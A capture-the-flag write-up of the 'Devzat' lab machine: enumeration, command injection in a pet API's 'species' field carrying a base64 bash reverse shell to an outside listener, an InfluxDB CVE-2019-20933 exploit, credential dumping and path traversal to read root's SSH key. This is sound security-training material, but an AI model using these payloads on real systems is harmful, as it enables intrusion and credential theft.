# Devzat machine Writeup

## DEVZAT WRITEUP 
- I am trustie_rity and in this writeup ,i will show a detailed walkthrough in solving Devzat machine .

<img src="../images/articles/devzat/devzat.png" />

#### Enumeration
nmap returns the following information about our target.
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-26 09:18 EAT
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.40s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: devzat - where the devs at
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=3/26%Time=623EB0A4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.05 seconds
```
From the scan we get the name of the domain so we quickly add that to /etc/hosts

- Checking port 80 we get a chatting tool .At this point it is not so helpful.
 <img src="../images/articles/devzat/web.png" />
- I did bruteforce the directories and  didn't find anything juicy.
- I did an nmap scan for the UDP ports and got nothing useful.
- Going ahead i did subdomain enumeration
#### Subdomain enumeration
```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devzat.htb/ -H "Host:  FUZZ.devzat.htb" --hw 26

```
- Perfect i found this  subdomain . Add it to /etc/hosts
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devzat.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                             
=====================================================================

000003745:   200        20 L     35 W       510 Ch      "pets"                                                                              

Total time: 345.5406
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 14.43824

```
- We get this website
<img src="../images/articles/devzat/pet.png" />
This subdomain has a functionality to add a pet. Capturing the request with burpsuite i was able to do some remote code execution (RCE)
<img src="../images/articles/devzat/burp.png" />

#### Getting reverse shell
Lets modify the species parameter, we have to use some command to establish a reverse shell in base64 and then we will decode it and execute it on the victim machine.
<img src="../images/articles/devzat/term.png" />
```
{
"name":"cat",
"species":"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44LzQ0NDQgMD4mMQo=|base64 -d|bash`"
}
```
Before sending the request we open a netcat listener to establish a connection with our reversshell.
```
rlwrap nc -nlvp 4444
```
#### In reverseshell
<img src="../images/articles/devzat/term1.png" />
Now we are the user Patrick, after looking for a while I realized that we have to become the user Catherine, since as Patrick we cannot do much.
- To establish a more nicer connection ,i get my public ssh keys to patrick's authorized keys so i can connect using ssh.
<img src="../images/articles/devzat/term2.png" />
Now we can test the chatting tool we saw on port 80 with user Catherine and patrick.
```
 ssh -l [username] devzat.htb -p 8000 
```
With user Catherine.
```
 ssh -l catherine localhost -p 8000 
```
We get the following messages ..
```
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
devbot: patrick has left the chat

```
We noticed that we have a development program in the port 8443, we keep this information for later, and that we have a password in the backup directory.

Now trying the same with user patrick .
I get the following messages.
```
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat

```
Once we read this chat we find out that there is an influxdb configured. Investigating about it and carrying out several tests we finally concluded that it is vulnerable. We get the following github exploit.
[Github Exploit](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git)
We download it and install the requirements. Before executing it, we must perform a port redirection to our attacking machine, specifically port 8086, since it is the one used by the database.
```
ssh -i id_rsa_patrick -L 8086:localhost:8086 patrick@devzat.htb
```
Once we run the exploit, with a username wordlist we view 2 databases, i tried I have tried with the 2 and with several tables in the end I have come to the conclusion that the correct ones are the following. We select the database devzat
```
 - using CVE-2019-20933

Host (default: localhost): 
Port (default: 8086): 
Username <OR> path to username file (default: users.txt): 

Bruteforcing usernames ...
[v] admin

Host vulnerable !!!

Databases:

1) devzat
2) _internal
```
Then we can dump all infomation from user table.
```
[admin@127.0.0.1/devzat] $ select * from "USER";
{
    "results": [
        {
            "statement_id": 0
        }
    ]
}
[admin@127.0.0.1/devzat] $ select * from "user";
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oog*************",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

```
Now lets login as user catherine with the password obtained .
<img src="../images/articles/devzat/patt.png" />
#### Privelege Escalation :accept: 
After conducting several investigations, I have realized that we can indeed see port 8443 open and as we had seen before in the chats that we had a program in development
```
catherine@devzat:/home$ netstat -punta | grep LISTEN
(No info could be read for "-p": geteuid()=1001 but you should be root.)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -       
```
We had been told that the project was in the backup directory, now we will proceed to see which project it is, we saw the following files in /var/backups.
```
catherine@devzat:/var/backups$ ls -al
total 1356
drwxr-xr-x  2 root      root        4096 Mar 26 06:25 .
drwxr-xr-x 14 root      root        4096 Jun 22  2021 ..
-rw-r--r--  1 root      root       51200 Mar 25 06:25 alternatives.tar.0
-rw-r--r--  1 root      root       59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r--  1 root      root        6588 Sep 21  2021 apt.extended_states.1.gz
-rw-r--r--  1 root      root        6602 Jul 16  2021 apt.extended_states.2.gz
-rw-------  1 catherine catherine  28297 Jul 16  2021 devzat-dev.zip
-rw-------  1 catherine catherine  27567 Jul 16  2021 devzat-main.zip
-rw-r--r--  1 root      root         268 Sep 29 11:46 dpkg.diversions.0
-rw-r--r--  1 root      root         139 Sep 29 11:46 dpkg.diversions.1.gz
-rw-r--r--  1 root      root         170 Jul 16  2021 dpkg.statoverride.0
-rw-r--r--  1 root      root         152 Jul 16  2021 dpkg.statoverride.1.gz
-rw-r--r--  1 root      root      949034 Jan 26 14:52 dpkg.status.0
-rw-r--r--  1 root      root      224734 Jan 26 14:52 dpkg.status.1.gz

```
The file devzat-dev.zip catches my attention, since with the tag of “dev” I can guess that it was this file they were talking about. We are going to copy this file to our home directory and we are going to see what it is about.

After reading all the files I come to the conclusion that it is the same program that is in production, but in the commands.go file, we see that there is a function that is not in the project in production. We see that the function is called fileCommand, and the command is called file, this allows us to read files and display them on the screen, but a password is necessary, but in the same code we can see that password.
```
func fileCommand(u *user, args []string) {                                                                                                                                                                                                   
        if len(args) < 1 {                                                                                                                                                                                                                   
                u.system("Please provide file to print and the password")                                                                                                                                                                    
                return                                                                                                                                                                                                                       
        }                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                             
        if len(args) < 2 {                                                                                                                                                                                                                   
                u.system("You need to provide the correct password to use this function")
                return
        }

        path := args[0]
        pass := args[1]

        // Check my secure password
        if pass != "Ce********************" {
                u.system("You did provide the wrong password")
                return
        }
```
Therefore, if we enter the program that is running on port 8443, we can read privileged files with a password. Let’s try.
```
ssh -l  catherine localhost -p 8443
```
We see that the command is indeed there, so we are going to take advantage of it.
```
[SYSTEM] file - Paste a files content directly to chat [alpha]
```
Now we can be able to see id_rsa of root and connect via ssh to it.
```
catherine: /file ../../root/.ssh/id_rsa PASSWORD
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxO***************************************************************
[SYSTEM] HAAAAAt***************************************************************
[SYSTEM] AAAECtF***************************************************************
[SYSTEM] Q0ekw7Z********************************************
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
```
Now lets connect as root :+1: 
```
ssh -i id_root root@devzat.htb 
```
Grab the root flag :)

Connect with me :)
- [twitter](https://twitter.com/trustie_rity)
- [github](https://github.com/jkiguru)
- [linkedin](https://www.linkedin.com/in/john-kiguru-2960831b8/)
- [medium stories](https://medium.com/@trustie)

<style>

html, body, .ui-content {
    background-color: #333;
    color: #ddd;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
    color: #ddd;
}

.markdown-body h1,
.markdown-body h2 {
    border-bottom-color: #ffffff69;
}

.markdown-body h1 .octicon-link,
.markdown-body h2 .octicon-link,
.markdown-body h3 .octicon-link,
.markdown-body h4 .octicon-link,
.markdown-body h5 .octicon-link,
.markdown-body h6 .octicon-link {
    color: #fff;
}

.markdown-body img {
    background-color: transparent;
}

.ui-toc-dropdown .nav>.active:focus>a, .ui-toc-dropdown .nav>.active:hover>a, .ui-toc-dropdown .nav>.active>a {
    color: white;
    border-left: 2px solid white;
}

.expand-toggle:hover, 
.expand-toggle:focus, 
.back-to-top:hover, 
.back-to-top:focus, 
.go-to-bottom:hover, 
.go-to-bottom:focus {
    color: white;
}


.ui-toc-dropdown {
    background-color: #333;
}

.ui-toc-label.btn {
    background-color: #191919;
    color: white;
}

.ui-toc-dropdown .nav>li>a:focus, 
.ui-toc-dropdown .nav>li>a:hover {
    color: white;
    border-left: 1px solid white;
}

.markdown-body blockquote {
    color: #bcbcbc;
}

.markdown-body table tr {
    background-color: #5f5f5f;
}

.markdown-body table tr:nth-child(2n) {
    background-color: #4f4f4f;
}

.markdown-body code,
.markdown-body tt {
    color: #eee;
    background-color: rgba(230, 230, 230, 0.36);
}

a,
.open-files-container li.selected a {
    color: #5EB7E0;
}

</style>